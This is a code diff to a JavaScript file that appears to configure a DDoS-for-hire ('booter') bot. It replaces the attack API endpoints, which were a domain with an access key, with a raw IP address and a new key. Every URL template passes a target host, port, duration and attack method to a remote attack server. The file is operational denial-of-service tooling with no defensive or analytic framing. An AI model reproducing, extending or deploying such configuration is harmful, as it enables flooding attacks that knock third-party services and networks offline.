@@ -49,27 +49,27 @@ swhite = '\u001b[0;37m';
 var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']
 
 var SimpleAPI = [
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
 ];
 var NormalAPI = [
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var AdvancedAPI = [
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var servidorADM = [
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
-"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}",
+"http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"
 ];
 
-var TEMPLATE = ["http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"]
+var TEMPLATE = ["http://165.227.6.119/renunciate.php?key=renunciate123&host={0}&port={1}&time={2}&method={3}"]
 
 var emoji = ['🆕']
 
